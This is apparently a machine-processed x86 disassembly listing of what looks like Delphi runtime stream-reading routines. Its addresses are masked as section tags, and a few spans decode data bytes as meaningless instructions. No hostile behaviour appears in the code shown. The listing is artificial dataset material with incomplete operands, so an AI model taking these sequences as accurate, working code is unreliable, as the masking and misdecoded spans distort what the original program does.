mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_4030c8
test al al
jne r-xdata
sub_419d4c
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_419d98
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_419d98
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e0
call sub_4038d8
sub_419de8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_419e33
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41b5e8
mov eax [ ebp - 0x4 ]
call sub_40415c
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419e3a
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
call sub_419824
sub_419e40
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_419ee0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4199e4
test al al
jne r-xdata
mov eax ebx
call sub_4199e4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_417338
jmp r-xdata
mov eax ebx
call sub_419d28
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_41a950
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419ee7
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_417318
mov esi eax
mov eax ebx
call sub_41a948
jmp r-xdata
mov eax ebx
call sub_41a898
mov eax ebx
call sub_4199e4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41aab4
mov eax ebx
call sub_41a950
sub_419f10
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404ee8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_4169bc
inc esi
dec ebx
jne r-xdata
sub_419f4c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_41cadc
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404ee8
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4050a4
add esp 0x4
mov edx ebx
mov eax edi
call sub_41cab0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404ee8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_41cab0
test [ eax + 0x24 ] 0x4
je r-xdata
sub_419fc4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404ee8
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_41a02c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_41a04c
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_4027c4
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_41a02c
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_41ba7c
call sub_4027c4
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_403164
sub_41a0ac
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41a192
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41bc1c
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x6c ]
call [ esi + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_41a166
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41a197
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41a04c
pop ecx
test al al
jne r-xdata
call sub_403954
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403900
sub_41a1bc
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41a234
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_403360
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_416664
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41a239
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41a04c
pop ecx
test al al
jne r-xdata
call sub_403954
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403900
sub_41a25c
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41a2d7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41bc1c
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_403360
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41a2dc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41a04c
pop ecx
test al al
jne r-xdata
call sub_403954
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403900
sub_41a300
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41a521
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_41b5ac
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41b5ac
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_41a4f1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_41a4af
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_419f4c
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_419fc4
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_41a0ac
pop ecx
push ebp
call sub_41a25c
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_41a1bc
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_403984
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_419fc4
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
mov ax [ r-xdata ]
call sub_419fc4
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a528
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_403ec0
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4050b0
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_403360
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_416b74
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_419f10
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_4169bc
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_419f10
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_4169bc
sub_41a4b4
push ebp
call sub_41a02c
pop ecx
test al al
je r-xdata
call sub_403900
call sub_403954
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_403164
sub_41a53c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41a5ac
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_41a597
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41a5ac
mov eax [ ebp - 0x4 ]
call sub_419afc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_419c40
retn
sub_41a5ac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4199e4
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41aab4
mov eax [ ebp - 0x4 ]
call sub_41a950
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_403360
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_41a66e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_403360
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4199e4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41a300
mov eax [ ebp - 0x4 ]
call sub_41a950
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a675
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_41a67c
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_41b788
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41a904
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_419d4c
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
sub_41a6c0
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_41b788
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41a904
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_419d4c
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_41a704
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41b788
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41a904
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_419d4c
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_41a754
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41b788
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41a904
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_419d4c
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_41a798
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_41b788
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_419824
mov al [ eax + lookup_table_41a7bf ]
jmp [ eax * 4 + jump_table_41a7cd ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_419d4c
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_403f8c
mov eax esi
call j_sub_404368
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_419d4c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403ef0
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403ef0
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403ef0
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403ef0
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_41a898
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41b788
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_419d4c
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_419d4c
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_419d4c
jmp r-xdata
jmp r-xdata
call sub_419824
sub_41a904
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_419d28
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_41a898
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_41b788
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_419d4c
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_41a958
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_419d28
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_41b788
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_41a898
mov [ edi ] eax
sub_41a995
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41aa89
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_403e9c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_403f34
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b51c
call sub_4038d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41aa90
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4030b4
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404100
sub_41aab4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41ac84
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_403718
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_41b5ac
xor edx edx
push ebp
push j_sub_403718#2
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
call sub_40415c
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx ebx
sub ecx edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_4043bc
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_40338c
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_413884
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_40338c
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_413884
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41ae38
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_419d38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_419d38
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_4032f0
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_4138f4
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_41aa98
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ac8b
lea eax [ ebp - 0x8 ]
call sub_403e9c
retn
mov edi ebx
jmp r-xdata
sub_41ac3e
add [ eax ] eax
add [ eax ] al
pop eax
outsd
inc eax
add [ edx - 0x54 ] cl
inc ecx
add [ ecx - 0xbba743d ] cl
cmp [ eax + 0x78 ] 0x0
je r-xdata
call sub_403900
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403954
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ac8b
lea eax [ ebp - 0x8 ]
call sub_403e9c
retn
sub_41ac94
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_41650c
mov ebx eax
test ebx ebx
je r-xdata
call sub_419824
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_413968
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41acdc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4192b8
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4169bc
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41ad1c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_41ad6b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41bea0
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_413e04
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ad72
lea eax [ ebp - 0x10 ]
call sub_40e98c
retn
sub_41ad78
push ebp
mov ebp esp
push 0x0
push 0x0
